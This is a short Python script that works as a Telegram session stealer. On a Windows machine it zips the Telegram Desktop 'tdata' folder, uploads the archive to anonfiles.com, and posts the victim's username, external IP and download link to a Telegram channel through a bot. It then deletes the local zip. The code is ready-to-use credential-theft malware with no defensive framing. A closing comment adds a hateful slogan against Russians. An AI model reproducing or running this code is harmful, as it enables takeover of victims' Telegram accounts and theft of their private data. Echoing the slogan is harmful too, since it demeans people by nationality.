# Imports
from anonfile import AnonFile
import os
import telebot
from zipfile import ZipFile
import urllib.request

# Config variables
BOT_TOKEN = ''
CHANNEL_ID = ''
OUTPUT_MESSAGE_PATTERN = 'USERNAME: {} \nIP: {} \nSYSTEM_DRIVE: {}\nLINK: {}'
PATH_TO_TELEGRAM_DESKTOP_PATTERN = '{}/Users/{}/AppData/Roaming/Telegram Desktop'
USERNAME = os.getlogin()
URL_TO_ARCHIVE = None
SYSTEM_DRIVE = os.getenv("SystemDrive")


# Checks either telebot folder exists or not
try:
    os.chdir(f'{PATH_TO_TELEGRAM_DESKTOP_PATTERN.format(SYSTEM_DRIVE, USERNAME)}')
    any_tdata = True

except Exception as e:
    any_tdata = False

# Tries to get External IP
try:

    EXTERNAL_IP = urllib.request.urlopen('https://v4.ident.me').read().decode('utf8')
except Exception as e:
    
    EXTERNAL_IP = None

# Runs if folder "Telegram Desktop" exists
if any_tdata:

    # Creates .zip file and writes "tdata" into it
    with ZipFile(f'./{USERNAME}.zip', 'w') as zip_file:

            for root, dirs, files in os.walk('tdata'):

                for file in files:

                    try:

                            zip_file.write(os.path.join(root, file))     
                    except:

                            pass
                        
            zip_file.close()

    # Send file to anonfiles.com
    ZIP_FILE = open(f'./{USERNAME}.zip', 'rb')
    anon = AnonFile()
    upload = anon.upload(f'./{USERNAME}.zip')
    URL_TO_ARCHIVE = upload.url.geturl()
    
    bot = telebot.TeleBot(BOT_TOKEN)
    bot.send_message(CHANNEL_ID, OUTPUT_MESSAGE_PATTERN.format(USERNAME, EXTERNAL_IP, SYSTEM_DRIVE, URL_TO_ARCHIVE))
    
    FILES_IN_DIR = os.listdir()
else:

    bot = telebot.TeleBot(BOT_TOKEN)
    bot.send_message(CHANNEL_ID, f'USERNAME: {USERNAME} \nIP: {EXTERNAL_IP} \nSYSTEM_DRIVE: {SYSTEM_DRIVE}')

# Removes sent file
if any_tdata and f'{USERNAME}.zip' in FILES_IN_DIR:

    try:
        
        os.remove(f'{USERNAME}.zip')
    except:

        pass

"""
♠ ♠ ♠ Written by W <3 ♠ ♠ ♠

    ░██╗░░░░░░░██╗
    ░██║░░██╗░░██║
    ░╚██╗████╗██╔╝
    ░░████╔═████║░
    ░░╚██╔╝░╚██╔╝░
    ░░░╚═╝░░░╚═╝░░

FUCK ALL RUSSIANS
GLORY TO UKRAINE!!!
"""
